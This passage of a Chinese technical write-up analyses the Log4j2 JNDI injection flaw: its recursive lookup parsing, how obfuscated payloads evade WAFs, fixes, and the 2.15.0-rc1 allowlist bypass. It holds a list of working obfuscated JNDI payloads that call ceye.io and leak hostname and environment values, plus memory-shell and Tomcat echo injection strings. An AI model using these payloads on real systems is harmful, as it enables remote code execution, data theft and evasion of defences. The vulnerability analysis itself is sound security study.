class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (pos &lt; bufEnd) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">startMatchLen</span> <span class="operator">=</span> prefixMatcher.isMatch(chars, pos, offset, bufEnd); <span class="comment">// prefixMatcher用来匹配是否前两个字符是$&#123;</span></span><br><span class="line">            <span class="keyword">if</span> (startMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// found variable start marker，如果来到这里的话那么就说明了匹配到了$&#123;字符</span></span><br><span class="line">                <span class="keyword">if</span> (pos &gt; offset &amp;&amp; chars[pos - <span class="number">1</span>] == escape) &#123;</span><br><span class="line">                    <span class="comment">// escaped</span></span><br><span class="line">                    buf.deleteCharAt(pos - <span class="number">1</span>);</span><br><span class="line">                    chars = getChars(buf);</span><br><span class="line">                    lengthChange--;</span><br><span class="line">                    altered = <span class="literal">true</span>;</span><br><span class="line">                    bufEnd--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// find suffix，寻找后缀&#125;符号</span></span><br><span class="line">                    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">startPos</span> <span class="operator">=</span> pos;</span><br><span class="line">                    pos += startMatchLen;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">endMatchLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">nestedVarCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (pos &lt; bufEnd) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (substitutionInVariablesEnabled</span><br><span class="line">                                &amp;&amp; (endMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd)) != <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">// found a nested variable start</span></span><br><span class="line">                            nestedVarCount++;</span><br><span class="line">                            pos += endMatchLen;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        endMatchLen = suffixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">                        <span class="keyword">if</span> (endMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">                            pos++;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// found variable end marker</span></span><br><span class="line">                            <span class="keyword">if</span> (nestedVarCount == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="type">String</span> <span class="variable">varNameExpr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars, startPos + startMatchLen, pos - startPos - startMatchLen);</span><br><span class="line">                                <span class="keyword">if</span> (substitutionInVariablesEnabled) &#123;</span><br><span class="line">                                    <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">bufName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(varNameExpr);</span><br><span class="line">                                    substitute(event, bufName, <span class="number">0</span>, bufName.length()); <span class="comment">// 递归调用</span></span><br><span class="line">                                    varNameExpr = bufName.toString();</span><br><span class="line">                                &#125;</span><br><span class="line">                                pos += endMatchLen;</span><br><span class="line">                                <span class="keyword">final</span> <span class="type">int</span> <span class="variable">endPos</span> <span class="operator">=</span> pos;</span><br><span class="line"></span><br><span class="line">                                <span class="type">String</span> <span class="variable">varName</span> <span class="operator">=</span> varNameExpr;</span><br><span class="line">                                <span class="type">String</span> <span class="variable">varDefaultValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (valueDelimiterMatcher != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">final</span> <span class="type">char</span> [] varNameExprChars = varNameExpr.toCharArray();</span><br><span class="line">                                    <span class="type">int</span> <span class="variable">valueDelimiterMatchLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; varNameExprChars.length; i++) &#123;</span><br><span class="line">                                        <span class="comment">// if there&#x27;s any nested variable when nested variable substitution disabled, then stop resolving name and default value.</span></span><br><span class="line">                                        <span class="keyword">if</span> (!substitutionInVariablesEnabled</span><br><span class="line">                                                &amp;&amp; prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) != <span class="number">0</span>) &#123;</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">                                            varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">                                            varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// on the first call initialize priorVariables</span></span><br><span class="line">                                <span class="keyword">if</span> (priorVariables == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    priorVariables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                                    priorVariables.add(<span class="keyword">new</span> <span class="title class_">String</span>(chars, offset, length + lengthChange));</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// handle cyclic substitution</span></span><br><span class="line">                                checkCyclicSubstitution(varName, priorVariables);</span><br><span class="line">                                priorVariables.add(varName);</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// resolve the variable</span></span><br><span class="line">                                <span class="type">String</span> <span class="variable">varValue</span> <span class="operator">=</span> resolveVariable(event, varName, buf, startPos, endPos);</span><br><span class="line">                                <span class="keyword">if</span> (varValue == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    varValue = varDefaultValue;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (varValue != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="comment">// recursive replace</span></span><br><span class="line">                                    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">varLen</span> <span class="operator">=</span> varValue.length();</span><br><span class="line">                                    buf.replace(startPos, endPos, varValue);</span><br><span class="line">                                    altered = <span class="literal">true</span>;</span><br><span class="line">                                    <span class="type">int</span> <span class="variable">change</span> <span class="operator">=</span> substitute(event, buf, startPos, varLen, priorVariables);</span><br><span class="line">                                    change = change + (varLen - (endPos - startPos));</span><br><span class="line">                                    pos += change;</span><br><span class="line">                                    bufEnd += change;</span><br><span class="line">                                    lengthChange += change;</span><br><span class="line">                                    chars = getChars(buf); <span class="comment">// in case buffer was altered</span></span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// remove variable from the cyclic stack</span></span><br><span class="line">                                priorVariables.remove(priorVariables.size() - <span class="number">1</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            nestedVarCount--;</span><br><span class="line">                            pos += endMatchLen;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (top) &#123;</span><br><span class="line">            <span class="keyword">return</span> altered ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lengthChange;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+接着就是取出${xxxxx}其中的xxxx数据
+
+![image](/yuque-notes/02-Knowledge Book/assets/73e2b641-1586953-20220428153046806-1610702859.png)
+
+接着下面还会对该xxxx数据来进行检测`:`和`-`字符操作
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (valueDelimiterMatcher != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">final</span> <span class="type">char</span> [] varNameExprChars = varNameExpr.toCharArray();</span><br><span class="line">                                    <span class="type">int</span> <span class="variable">valueDelimiterMatchLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; varNameExprChars.length; i++) &#123;</span><br><span class="line">                                        <span class="comment">// if there&#x27;s any nested variable when nested variable substitution disabled, then stop resolving name and default value.</span></span><br><span class="line">                                        <span class="keyword">if</span> (!substitutionInVariablesEnabled</span><br><span class="line">                                                &amp;&amp; prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) != <span class="number">0</span>) &#123;</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="comment">// 如果检测到其中还有:和-的符号，那么会将其进行分隔， :- 前面的作为varName，后面的座位DefaultValue</span></span><br><span class="line">                                        <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">                                            varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">                                            varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br></pre></td></tr></table></figure>
+
+![image](/yuque-notes/02-Knowledge Book/assets/c719e182-1586953-20220428125859245-2122356265.png)
+
+上面的一系列数据检测都完成了之后接下来就是解析执行这段数据了，这里是通过resolveVariable方法
+
+![image](/yuque-notes/02-Knowledge Book/assets/09f6afd8-1586953-20220428153609445-673544279.png)
+
+他会通过getVariableResolver来获得一个实现StrLookup接口的对象
+
+![image](/yuque-notes/02-Knowledge Book/assets/8b9daa02-1586953-20220428153659458-1537693920.png)
+
+接着调用`return resolver.lookup(event, variableName);`
+
+![image](/yuque-notes/02-Knowledge Book/assets/3e14724d-1586953-20220428153642590-1835031860.png)
+
+支持的内置标签
+
+![image](/yuque-notes/02-Knowledge Book/assets/5631a0a3-1586953-20220428130107093-748579277.png)
+
+在resolveVariable函数中，最终通过jndiLookup对象的lookup方法来进行触发
+
+![image](/yuque-notes/02-Knowledge Book/assets/817052a2-1586953-20220428130131850-288609425.png)
+
+跟进去你会发现它会通过`:`字符来进行分隔两个字符串，一个是主键，一个是值，主键就是这里的`jndi`四个字符，值得话就是jndi访问的地址
+
+![image](/yuque-notes/02-Knowledge Book/assets/38e7429d-1586953-20220428153812279-1960068719.png)
+
+因为这里是jndi，那么log4j2就会拿到对应的jndi实现strlook接口的对象
+
+![image](/yuque-notes/02-Knowledge Book/assets/3ef7ddba-1586953-20220428153853685-38676141.png)
+
+最终就是lookup来触发jndi注入
+
+![image](/yuque-notes/02-Knowledge Book/assets/527528d3-1586953-20220428154411069-83944763.png)
+
+# log4j解析${}存在递归操作实现绕过防火墙分析
+
+假如传入的字符串为`${11111${222222}333333}`，它会先执行`${222222}`，然后将其解析出来的数据替换回去`${11111XXXXX33333}`，然后再解析`${11111XXXXX33333}`
+
+也就是如果你解析的字符为`${11111${222222}333333}`，它还会递归解析中间的`${xxxxxx}`的相关操作
+
+所以执行的话那么就是从里面到外面来进行执行的
+
+![image](/yuque-notes/02-Knowledge Book/assets/4e4a740f-1586953-20220428124627762-332496259.png)
+
+而这里通过log4j2的代码特性来实现对防火墙的绕过操作
+
+# log4j2相关的变形payload绕过WAF分析
+
+我收集到的有如下所示
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://127.0.0.1:1389/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;::-j&#125;</span><span class="variable">$&#123;::-n&#125;</span><span class="variable">$&#123;::-d&#125;</span><span class="variable">$&#123;::-i&#125;</span>:<span class="variable">$&#123;::-r&#125;</span><span class="variable">$&#123;::-m&#125;</span><span class="variable">$&#123;::-i&#125;</span>://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;::-j&#125;</span>ndi:rmi://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:rmi://ceye.io&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;lower:jndi&#125;</span>:<span class="variable">$&#123;lower:rmi&#125;</span>://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;lower:<span class="variable">$&#123;lower:jndi&#125;</span>&#125;</span>:<span class="variable">$&#123;lower:rmi&#125;</span>://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;lower:j&#125;</span><span class="variable">$&#123;lower:n&#125;</span><span class="variable">$&#123;lower:d&#125;</span>i:<span class="variable">$&#123;lower:rmi&#125;</span>://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;lower:j&#125;</span><span class="variable">$&#123;upper:n&#125;</span><span class="variable">$&#123;lower:d&#125;</span><span class="variable">$&#123;upper:i&#125;</span>:<span class="variable">$&#123;lower:r&#125;</span>m<span class="variable">$&#123;lower:i&#125;</span>&#125;://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;upper:jndi&#125;</span>:<span class="variable">$&#123;upper:rmi&#125;</span>://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;upper:j&#125;</span><span class="variable">$&#123;upper:n&#125;</span><span class="variable">$&#123;lower:d&#125;</span>i:<span class="variable">$&#123;upper:rmi&#125;</span>://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;upper:j&#125;</span><span class="variable">$&#123;upper:n&#125;</span><span class="variable">$&#123;upper:d&#125;</span><span class="variable">$&#123;upper:i&#125;</span>:<span class="variable">$&#123;lower:r&#125;</span>m<span class="variable">$&#123;lower:i&#125;</span>&#125;://ceye.io/a&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;::-j&#125;</span><span class="variable">$&#123;::-n&#125;</span><span class="variable">$&#123;::-d&#125;</span><span class="variable">$&#123;::-i&#125;</span>:<span class="variable">$&#123;::-l&#125;</span><span class="variable">$&#123;::-d&#125;</span><span class="variable">$&#123;::-a&#125;</span><span class="variable">$&#123;::-p&#125;</span>://<span class="variable">$&#123;hostName&#125;</span>.ceye.io&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;upper::-j&#125;</span><span class="variable">$&#123;upper::-n&#125;</span><span class="variable">$&#123;::-d&#125;</span><span class="variable">$&#123;upper::-i&#125;</span>:<span class="variable">$&#123;upper::-l&#125;</span><span class="variable">$&#123;upper::-d&#125;</span><span class="variable">$&#123;upper::-a&#125;</span><span class="variable">$&#123;upper::-p&#125;</span>://<span class="variable">$&#123;hostName&#125;</span>.ceye.io&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;<span class="variable">$&#123;::-j&#125;</span><span class="variable">$&#123;::-n&#125;</span><span class="variable">$&#123;::-d&#125;</span><span class="variable">$&#123;::-i&#125;</span>:<span class="variable">$&#123;::-l&#125;</span><span class="variable">$&#123;::-d&#125;</span><span class="variable">$&#123;::-a&#125;</span><span class="variable">$&#123;::-p&#125;</span>://<span class="variable">$&#123;hostName&#125;</span>.<span class="variable">$&#123;env:COMPUTERNAME&#125;</span>.<span class="variable">$&#123;env:USERDOMAIN&#125;</span>.<span class="variable">$&#123;env&#125;</span>.ceye.io</span></span><br></pre></td></tr></table></figure>
+
+这里可以来看下`${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a}`这段是如何进行解析的，这个其实就是涉及到上面有看到的递归解析和`:-`分隔的操作
+
+nestedVarCount就是用来统计嵌套的次数
+
+![image](/yuque-notes/02-Knowledge Book/assets/ce9fee97-1586953-20220428161936251-1244899213.png)
+
+如果nestedVarCount不为0的情况下匹配到了`}`那么它会执行如下操作，跳过上面的递归操作，将nestedVarCount--然后继续判断字符
+
+![image](/yuque-notes/02-Knowledge Book/assets/30e3c10c-1586953-20220428162043876-2131921978.png)
+
+那么上面这种如果是`${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a}`
+
+它第一次走完拿到的字符串就是`${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a`
+
+接着就是递归调用`${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a`
+
+![image](/yuque-notes/02-Knowledge Book/assets/4b58333b-1586953-20220428162642739-556807483.png)
+
+这时候的处理就是`${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a`
+
+此时nestedVarCount就不会为1了，因为一次就是`${`和`}`，所以接下来都是`${::-j}` `${::-n}` `${::-d}` ... 这样来进行解析
+
+这次的话传入的就是`::-j`
+
+![image](/yuque-notes/02-Knowledge Book/assets/664df291-1586953-20220428163422349-818380244.png)
+
+由于`::-j`没有了相关的标识符`${}`，所以就直接进行了解析操作，因为`:-`作为分隔，所以主键就是`:`和值为`j`
+
+![image](/yuque-notes/02-Knowledge Book/assets/63b8adc4-1586953-20220428163612900-1171729820.png)
+
+主键`:`会被传入到resolveVariable进行解析，而log4j2在解析的时候如果匹配不到对应的主键那么就只会返回对应的值，所以这里就会返回`j`
+
+![image](/yuque-notes/02-Knowledge Book/assets/1c593a53-1586953-20220428164158230-359823627.png)
+
+接着就会对`${::-j}`字符串进行替换为`j`
+
+![image](/yuque-notes/02-Knowledge Book/assets/fa0606e6-1586953-20220428164242200-2130284575.png)
+
+初始化：`${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a}`
+
+第一次substitute函数：`${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a`
+
+第二次substitute函数：`${::-j} -> ::-j -> j`
+
+第三次substitute函数：`${::-n} -> ::-n -> n`
+
+以此类推那么最终的字符串就是这段获得的字符串就是`jndi:rmi://ceye.io/a`，那么递归回到第一段的时候，最终jndi解析的就是`rmi://ceye.io/a`
+
+![image](/yuque-notes/02-Knowledge Book/assets/49ead97e-1586953-20220428164636432-316933988.png)
+
+tomcat注入回显测试：`${jndi:ldap://172.20.10.2:1389/TomcatBypass/TomcatEcho}`
+
+![image](/yuque-notes/02-Knowledge Book/assets/80eb5271-1586953-20220618234958978-601140317.png)
+
+内存马注入命令执行：`${jndi:ldap://172.20.10.2:1389/Basic/SpringMemshell}`
+
+`http://127.0.0.1:8089/poc2020?type=basic&pass=ipconfig`
+
+![image](/yuque-notes/02-Knowledge Book/assets/c392f9a1-1586953-20220618235906951-1881054414.png)
+
+# 关于Spring Boot的log4j2的jndi注入
+
+因为Spring Boot Starter中默认使用的日志框架是logging，所以这里如果要使用log4j2日志框架的话那么需要进行设置
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 排除掉logging，不使用logback，改用log4j2 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+# 修复
+
+参考：[https://logging.apache.org/log4j/2.x/security.html#CVE-2021-44832](https://logging.apache.org/log4j/2.x/security.html#CVE-2021-44832)
+
+Apache Log4j2 版本 2.0-beta7 到 2.17.0（不包括安全修复版本 2.3.2 和 2.12.4）容易受到远程代码执行 (RCE) 攻击，其中有权修改日志配置文件的攻击者可以构建恶意配置将 JDBC Appender 与引用 JNDI URI 的数据源一起使用，该 JNDI URI 可以执行远程代码。此问题已通过将 JNDI 数据源名称限制为 Log4j2 版本 2.17.1、2.12.4 和 2.3.2 中的 java 协议来解决。
+
+升级到 Log4j 2.3.2（适用于 Java 6）、2.12.4（适用于 Java 7）或 2.17.1（适用于 Java 8 及更高版本）
+
+![image](/yuque-notes/02-Knowledge Book/assets/b0121ec5-1586953-20220524114533607-1530666882.png)
+
+# log4j-2.15.0-rc1的绕过问题
+
+[https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1)
+
+此时加载的Converter有如下，之前的MessagePatternConverter此时已经用其内部类SimpleMessagePatternConverter来进行解析了
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DatePatternConverter</span><br><span class="line">SimpleLiteralPatternConverter</span><br><span class="line">LevelPatternConverter<span class="variable">$SimpleLevelPatternConverter</span></span><br><span class="line">SimpleLiteralPatternConverter</span><br><span class="line">ThreadNamePatternConverter</span><br><span class="line">SimpleLiteralPatternConverter</span><br><span class="line">ClassNamePatternConverter</span><br><span class="line">SimpleLiteralPatternConverter</span><br><span class="line">MessagePatternConverter<span class="variable">$SimpleMessagePatternConverter</span></span><br><span class="line">LineSeparatorPatternConverter</span><br><span class="line">ExtendedThrowablePatternConverter</span><br></pre></td></tr></table></figure>
+
+![image](/yuque-notes/02-Knowledge Book/assets/b65e9fd7-1586953-20220524124339564-171393343.png)
+
+这里跟进去进行查看可以看到，返回的内容直接就是原来的内容，已经不会进行其他的处理了
+
+![image](/yuque-notes/02-Knowledge Book/assets/6173eac8-1586953-20220524124858282-553419724.png)
+
+![image](/yuque-notes/02-Knowledge Book/assets/ea527e5b-1586953-20220524125030584-2071021375.png)
+
+但是这边你通过寻找哪个类实现了PatternConverter，你会发现LookupMessagePatternConverter这个同样也具有lookup的功能
+
+![image](/yuque-notes/02-Knowledge Book/assets/148881b5-1586953-20220524125353615-1808880981.png)
+
+如果想要生成的MessagePatternConverter对象需要为LookupMessagePatternConverter的话，这里的话就需要将"lookup"配置进行开启，默认情况下没有这个LookupMessagePatternConverter来进行解析的
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> MessagePatternConverter <span class="title function_">newInstance</span><span class="params">(<span class="keyword">final</span> Configuration config, <span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">lookups</span> <span class="operator">=</span> loadLookups(options);</span><br><span class="line">        String[] formats = withoutLookupOptions(options);</span><br><span class="line">        <span class="type">TextRenderer</span> <span class="variable">textRenderer</span> <span class="operator">=</span> loadMessageRenderer(formats);</span><br><span class="line">        <span class="type">MessagePatternConverter</span> <span class="variable">result</span> <span class="operator">=</span> formats == <span class="literal">null</span> || formats.length == <span class="number">0</span></span><br><span class="line">                ? SimpleMessagePatternConverter.INSTANCE</span><br><span class="line">                : <span class="keyword">new</span> <span class="title class_">FormattedMessagePatternConverter</span>(formats);</span><br><span class="line">        <span class="keyword">if</span> (lookups &amp;&amp; config != <span class="literal">null</span>) &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="title class_">LookupMessagePatternConverter</span>(result, config);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (textRenderer != <span class="literal">null</span>) &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="title class_">RenderingPatternConverter</span>(result, textRenderer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+![image](/yuque-notes/02-Knowledge Book/assets/c3511fac-1586953-20220524183719397-249729020.png)
+
+只有这样返回的才是LookupMessagePatternConverter对象
+
+![image](/yuque-notes/02-Knowledge Book/assets/74410c8a-1586953-20220524184117359-1894636430.png)
+
+而在LookupMessagePatternConverter中进行jndi注入的时候也不是直接就可以的
+
+获得LookupMessagePatternConverter的代码实现jndi解析的时候，这里直接来看org/apache/logging/log4j/core/net/JndiManager.java
+
+在rc1的版本中的JndiManager的lookup方法存在相关的白名单验证，但是这里`URI uri = new URI(name);`如果解析异常的话，那么就绕过了其中的验证，主要在异常处理中没有直接结束，而是继续向下执行，导致最终执行了`return (T) this.context.lookup(name);`
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> &lt;T&gt; T <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(name);</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (URISyntaxException ex) &#123;</span><br><span class="line">        <span class="comment">// This is OK.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (T) <span class="built_in">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+整体的代码如下所示
+
